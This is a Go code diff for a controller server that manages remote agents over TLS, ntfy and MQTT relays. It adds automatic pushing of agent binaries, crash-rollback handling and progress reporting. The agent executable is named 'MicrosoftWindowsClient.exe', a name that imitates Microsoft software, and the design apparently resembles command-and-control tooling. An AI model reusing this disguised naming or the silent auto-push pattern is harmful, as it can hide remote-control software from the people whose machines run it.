@@ -81,7 +81,12 @@ type AgentConn struct {
 	user     string
 	id       string
 	version  string // DesktopAgentVersion from TypeConnect/hello ("" = old agent, unknown)
-	mu       sync.Mutex
+	// Crash-rollback report from hello: the watchdog restored the previous
+	// binary after RollbackBad crash-looped. While set, update-all holds
+	// back re-pushing the bad version.
+	rollbackBad string
+	rollbackTo  string
+	mu          sync.Mutex
 
 	lastSeenMu sync.Mutex
 	lastSeen   time.Time
@@ -206,6 +211,13 @@ type Server struct {
 	rsaPriv *rsa.PrivateKey
 	e2eMu   sync.Mutex
 	e2eKeys map[string][32]byte
+
+	// Auto-update: when true, an outdated hello triggers a bundled-binary
+	// push without clicking Update All. autoPushed remembers the version
+	// already pushed per agent id so re-announces don't re-push.
+	autoUpdate atomic.Bool
+	autoMu     sync.Mutex
+	autoPushed map[string]string
 }
 
 type wsClient struct {
@@ -266,6 +278,7 @@ func StartBackground(opts Options) (*Server, error) {
 	}
 	s.tlsCfg = &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}
 	s.e2eKeys = make(map[string][32]byte)
+	s.autoPushed = make(map[string]string)
 	if priv, ok := cert.PrivateKey.(*rsa.PrivateKey); ok {
 		s.rsaPriv = priv
 	} else {
@@ -573,21 +586,78 @@ func (s *Server) e2eSealMsg(host string, msg protocol.Message) (json.RawMessage,
 	return sealed, true
 }
 
+// bundledAgentBin locates the agent binary shipped next to the controller
+// (post-rename name first, pre-rename fallback for mixed installs).
+func (s *Server) bundledAgentBin() string {
+	if exe, err := os.Executable(); err == nil {
+		if st, err := os.Stat(filepath.Join(filepath.Dir(exe), "MicrosoftWindowsClient.exe")); err == nil && !st.IsDir() {
+			return filepath.Join(filepath.Dir(exe), "MicrosoftWindowsClient.exe")
+		}
+		if st, err := os.Stat(filepath.Join(filepath.Dir(exe), "agent.exe")); err == nil && !st.IsDir() {
+			return filepath.Join(filepath.Dir(exe), "agent.exe")
+		}
+	}
+	if st, err := os.Stat("MicrosoftWindowsClient.exe"); err == nil && !st.IsDir() {
+		return "MicrosoftWindowsClient.exe"
+	}
+	if st, err := os.Stat("agent.exe"); err == nil && !st.IsDir() {
+		return "agent.exe"
+	}
+	return ""
+}
+
+// updateProg emits a live progress event for the UI progress readout.
+func (s *Server) updateProg(ac *AgentConn, sent, total int, status string) {
+	s.broadcastWS(map[string]interface{}{
+		"type": "update-progress", "id": ac.id, "hostname": ac.hostname,
+		"sent": sent, "total": total, "status": status,
+	})
+}
+
+// sendWithRetry delivers one update envelope, retrying once after a short
+// pause (relay buses drop the occasional chunk; a single retry saves the
+// whole multi-minute push from failing on one lost packet).
+func (s *Server) sendWithRetry(ac *AgentConn, msg protocol.Message, what string) error {
+	if err := s.sendToAgent(ac, msg); err == nil {
+		return nil
+	} else {
+		log.Printf("[update] %s %s failed, retrying once: %v", ac.id, what, err)
+		time.Sleep(time.Second)
+		if err2 := s.sendToAgent(ac, msg); err2 != nil {
+			return fmt.Errorf("%s failed after retry: %w", what, err2)
+		}
+		return nil
+	}
+}
+
 // pushAgentUpdate streams the bundled agent binary to one agent in
-// per-transport chunks. The agent verifies SHA256, swaps its exe, and
-// restarts (singleton dedupes overlap). Progress lands in the terminal
-// via the agent's own outputs. Returns true if all chunks were sent.
+// per-transport chunks. The agent verifies SHA256, stashes the running exe
+// as prev, swaps, and restarts (a crash loop gets rolled back by the
+// watchdog, which then notifies us via hello). Progress lands in the UI
+// live via update-progress events. Returns true if all chunks were sent.
 func (s *Server) pushAgentUpdate(ac *AgentConn, bin string) bool {
 	data, err := os.ReadFile(bin)
 	if err != nil {
 		log.Printf("[update] read %s: %v", bin, err)
 		s.broadcastWS(map[string]interface{}{"type": "output", "id": ac.id, "data": "push-update failed: cannot read bundled agent binary", "success": false})
+		s.updateProg(ac, 0, 0, "failed")
 		return false
 	}
 	if ac.version != "" && ac.version == version.DesktopAgentVersion {
 		log.Printf("[update] %s already up to date (%s), skipping", ac.id, ac.version)
 		s.broadcastWS(map[string]interface{}{"type": "output", "id": ac.id, "data": fmt.Sprintf("skip %s: already %s", ac.hostname, ac.version), "success": true})
 		return true
+	}
+	// Hold back a version the agent already crash-rolled-back: re-pushing
+	// it would crash-loop the remote again.
+	s.agentsMu.RLock()
+	rb := ac.rollbackBad
+	s.agentsMu.RUnlock()
+	if rb != "" && rb == version.DesktopAgentVersion {
+		log.Printf("[update] %s held back: v%s crash-rolled-back on %s, not re-pushing", ac.id, rb, ac.hostname)
+		s.broadcastWS(map[string]interface{}{"type": "output", "id": ac.id, "data": fmt.Sprintf("hold %s: v%s crashed there before (rolled back to %s) — fix the build first", ac.hostname, rb, ac.rollbackTo), "success": false})
+		s.updateProg(ac, 0, 0, "heldback")
+		return false
 	}
 	sum := sha256.Sum256(data)
 	sha := hex.EncodeToString(sum[:])
@@ -606,9 +676,11 @@ func (s *Server) pushAgentUpdate(ac *AgentConn, bin string) bool {
 	total := (len(data) + chunkRaw - 1) / chunkRaw
 	log.Printf("[update] pushing agent binary (%d bytes, %d chunks) to %s%s", len(data), total, ac.id, slowWarn)
 	s.broadcastWS(map[string]interface{}{"type": "output", "id": ac.id, "data": fmt.Sprintf("pushing update (%d bytes, %d chunks)%s", len(data), total, slowWarn), "success": true})
+	s.updateProg(ac, 0, total, "pushing")
 	begin := protocol.Message{Type: protocol.TypeUpdateBegin, UpdateVer: version.DesktopAgentVersion, UpdateSize: int64(len(data)), UpdateSHA: sha, UpdateTotal: total}
-	if err := s.sendToAgent(ac, begin); err != nil {
+	if err := s.sendWithRetry(ac, begin, "update begin"); err != nil {
 		log.Printf("[update] begin failed: %v", err)
+		s.updateProg(ac, 0, total, "failed")
 		return false
 	}
 	for i := 0; i < total; i++ {
@@ -621,25 +693,29 @@ func (s *Server) pushAgentUpdate(ac *AgentConn, bin string) bool {
 			UpdateSeq: i,
 			Data:      base64.StdEncoding.EncodeToString(data[i*chunkRaw : end]),
 		}
-		if err := s.sendToAgent(ac, chunk); err != nil {
-			log.Printf("[update] chunk %d failed: %v", i, err)
+		if err := s.sendWithRetry(ac, chunk, fmt.Sprintf("chunk %d", i)); err != nil {
+			log.Printf("[update] %v", err)
+			s.updateProg(ac, i, total, "failed")
 			return false
 		}
 		if (i+1)%20 == 0 || i+1 == total {
 			log.Printf("[update] %s: %d/%d chunks", ac.id, i+1, total)
+			s.updateProg(ac, i+1, total, "pushing")
 		}
 		if pacing > 0 {
 			time.Sleep(pacing)
 		}
 	}
 	log.Printf("[update] %s: all chunks sent, waiting for agent verify+restart", ac.id)
+	s.updateProg(ac, total, total, "sent")
 	return true
 }
 
 // pushAgentUpdateAll streams the bundled binary to every outdated connected
 // agent, sequentially with a small gap (so relay buses aren't flooded).
-// Returns how many were actually pushed (skips up-to-date + offline).
-func (s *Server) pushAgentUpdateAll(bin string) (pushed, skipped, offline int) {
+// Agents that crash-rolled-back this exact version are held back, never
+// re-pushed. Returns pushed/skipped/offline/heldback counts.
+func (s *Server) pushAgentUpdateAll(bin string) (pushed, skipped, offline, heldback int) {
 	// Snapshot outdated, online agents (copy ids so we don't hold the lock
 	// while doing slow chunked sends).
 	s.agentsMu.RLock()
@@ -657,14 +733,18 @@ func (s *Server) pushAgentUpdateAll(bin string) (pushed, skipped, offline int) {
 			skipped++
 			continue
 		}
+		if a.rollbackBad != "" && a.rollbackBad == version.DesktopAgentVersion {
+			heldback++
+			continue
+		}
 		targets = append(targets, id)
 	}
 	s.agentsMu.RUnlock()
 	if len(targets) == 0 {
-		s.broadcastWS(map[string]interface{}{"type": "output", "data": fmt.Sprintf("update-all: nothing outdated (%d up to date, %d offline)", skipped, offline), "success": true})
-		return 0, skipped, offline
+		s.broadcastWS(map[string]interface{}{"type": "output", "data": fmt.Sprintf("update-all: nothing to push (%d up to date, %d offline, %d held back after rollback)", skipped, offline, heldback), "success": true})
+		return 0, skipped, offline, heldback
 	}
-	s.broadcastWS(map[string]interface{}{"type": "output", "data": fmt.Sprintf("update-all: pushing %d agent(s) (%d up to date, %d offline skipped)", len(targets), skipped, offline), "success": true})
+	s.broadcastWS(map[string]interface{}{"type": "output", "data": fmt.Sprintf("update-all: pushing %d agent(s) (%d up to date, %d offline, %d held back skipped)", len(targets), skipped, offline, heldback), "success": true})
 	for _, id := range targets {
 		ac := s.getAgentByID(id)
 		if ac == nil {
@@ -673,7 +753,83 @@ func (s *Server) pushAgentUpdateAll(bin string) (pushed, skipped, offline int) {
 		s.pushAgentUpdate(ac, bin)
 		time.Sleep(800 * time.Millisecond)
 	}
-	return len(targets), skipped, offline
+	return len(targets), skipped, offline, heldback
+}
+
+// noteHello records version + rollback report from any hello transport,
+// fires the rollback alarm on first sight, and kicks auto-update when
+// enabled. Safe to call redundantly on re-announces.
+func (s *Server) noteHello(id, hostname, ver, bad, to string) {
+	s.agentsMu.Lock()
+	ac, ok := s.agents[id]
+	if ok {
+		if ver != "" {
+			ac.version = ver
+		}
+		prevBad := ac.rollbackBad
+		ac.rollbackBad, ac.rollbackTo = bad, to
+		s.agentsMu.Unlock()
+		if bad != "" && prevBad != bad {
+			s.handleRollback(id, hostname, bad, to)
+		}
+	} else {
+		s.agentsMu.Unlock()
+	}
+	if bad == "" {
+		s.maybeAutoUpdate(id)
+	}
+}
+
+// handleRollback alarms loudly (log + UI event + refreshed list) when an
+// agent reports the watchdog restored its previous binary after a crash
+// loop. The bad version stays held back from future pushes automatically.
+func (s *Server) handleRollback(id, hostname, bad, to string) {
+	log.Printf("[update] ROLLBACK ALARM: %s (%s) crashed on v%s — watchdog restored v%s. Holding back v%s.", hostname, id, bad, to, bad)
+	fmt.Printf("\n[ROLLBACK] %s (%s): v%s crashed, restored v%s — v%s held back\n> ", hostname, id, bad, to, bad)
+	s.broadcastWS(map[string]interface{}{
+		"type": "rollback", "id": id, "hostname": hostname, "bad": bad, "to": to,
+	})
+	s.broadcastAgents()
+}
+
+// maybeAutoUpdate pushes the bundled binary to one outdated agent when the
+// auto-update switch is on. Fires at most once per (agent, version): while
+// the push is in flight the agent still reports the old version, so without
+// the guard every re-announce would start another push.
+func (s *Server) maybeAutoUpdate(id string) {
+	if !s.autoUpdate.Load() {
+		return
+	}
+	ac := s.getAgentByID(id)
+	if ac == nil {
+		return
+	}
+	s.agentsMu.RLock()
+	ver, rb := ac.version, ac.rollbackBad
+	s.agentsMu.RUnlock()
+	if ver == version.DesktopAgentVersion {
+		s.autoMu.Lock()
+		delete(s.autoPushed, id)
+		s.autoMu.Unlock()
+		return
+	}
+	if ver == "" || (rb != "" && rb == version.DesktopAgentVersion) {
+		return // unknown version, or held back after rollback
+	}
+	s.autoMu.Lock()
+	if s.autoPushed[id] == version.DesktopAgentVersion {
+		s.autoMu.Unlock()
+		return
+	}
+	s.autoPushed[id] = version.DesktopAgentVersion
+	s.autoMu.Unlock()
+	bin := s.bundledAgentBin()
+	if bin == "" {
+		log.Printf("[update] auto-update: no bundled agent binary, skipping %s", id)
+		return
+	}
+	log.Printf("[update] auto-update: pushing %s to %s (%s)", version.DesktopAgentVersion, ac.hostname, id)
+	go s.pushAgentUpdate(ac, bin)
 }
 
 // resetMQTTBus drops both relay buses so mqttLoop re-dials (and
@@ -735,6 +891,7 @@ func (s *Server) Agents() []map[string]interface{} {
 		out = append(out, map[string]interface{}{
 			"id": a.id, "hostname": a.hostname, "user": a.user,
 			"version": a.version, "outdated": outdated,
+			"rollbackBad": a.rollbackBad, "rollbackTo": a.rollbackTo,
 			"connected": online, "seenAgoSec": seenAgo,
 			"latency": lat, "remote": a.remote(), "e2e": s.e2eHas(a.hostname),
 		})
@@ -1054,6 +1211,7 @@ func (s *Server) handleAgent(conn net.Conn, id string) {
 	if first.Version != "" && first.Version != version.Version {
 		log.Printf("[update] %s is outdated (%s vs %s) — push update available", first.Hostname, first.Version, version.Version)
 	}
+	s.noteHello(id, first.Hostname, first.Version, first.RollbackBad, first.RollbackTo)
 	fmt.Printf("\n[+] Agent connected: id=%s hostname=%s user=%s version=%s remote=%s\n", id, first.Hostname, first.User, first.Version, conn.RemoteAddr())
 	_ = ac.send(protocol.Message{Type: protocol.TypeConnected, ID: id})
 	s.broadcastWS(map[string]interface{}{"type": "output", "data": fmt.Sprintf("Agent %s (%s) connected", first.Hostname, id), "success": true})
@@ -1262,24 +1420,26 @@ func (s *Server) ntfyLoop() {
 				}
 				s.agentsMu.Unlock()
 			}
-			if !exists && msg.Type == protocol.TypeConnect {
-				ac = &AgentConn{hostname: hostname, user: msg.User, id: id, version: msg.Version}
-				s.setAgent(ac)
-				fmt.Printf("\n[+] Ntfy agent connected: %s (%s) v%s\n", hostname, id, msg.Version)
-				_ = relay.PublishTo("controller", name, protocol.Message{Type: protocol.TypeConnected, ID: id, E2E: true})
-				s.broadcastWS(map[string]interface{}{"type": "output", "data": fmt.Sprintf("Ntfy agent %s connected", hostname), "success": true})
-				continue
+		if !exists && msg.Type == protocol.TypeConnect {
+			ac = &AgentConn{hostname: hostname, user: msg.User, id: id, version: msg.Version}
+			s.setAgent(ac)
+			fmt.Printf("\n[+] Ntfy agent connected: %s (%s) v%s\n", hostname, id, msg.Version)
+			_ = relay.PublishTo("controller", name, protocol.Message{Type: protocol.TypeConnected, ID: id, E2E: true})
+			s.broadcastWS(map[string]interface{}{"type": "output", "data": fmt.Sprintf("Ntfy agent %s connected", hostname), "success": true})
+			s.noteHello(id, hostname, msg.Version, msg.RollbackBad, msg.RollbackTo)
+			continue
+		}
+		if !exists {
+			continue
+		}
+		ac.touch()
+		switch msg.Type {
+		case protocol.TypeConnect:
+			if msg.Version != "" {
+				ac.version = msg.Version
 			}
-			if !exists {
-				continue
-			}
-			ac.touch()
-			switch msg.Type {
-			case protocol.TypeConnect:
-				if msg.Version != "" {
-					ac.version = msg.Version
-				}
-				_ = relay.PublishTo("controller", name, protocol.Message{Type: protocol.TypeConnected, ID: id, E2E: true})
+			s.noteHello(id, hostname, msg.Version, msg.RollbackBad, msg.RollbackTo)
+			_ = relay.PublishTo("controller", name, protocol.Message{Type: protocol.TypeConnected, ID: id, E2E: true})
 			case protocol.TypeOutput:
 					s.ackCmd(msg.CmdID)
 					s.broadcastWS(map[string]interface{}{"type": "output", "id": id, "data": msg.Result, "error": msg.Error, "success": msg.Error == ""})
@@ -1642,6 +1802,7 @@ func (s *Server) handleMQTTMsg(topic string, env relay.Envelope) {
 				ac.version = msg.Version
 			}
 		}
+		s.noteHello(id, host, msg.Version, msg.RollbackBad, msg.RollbackTo)
 		s.broadcastAgents()
 		return
 	}
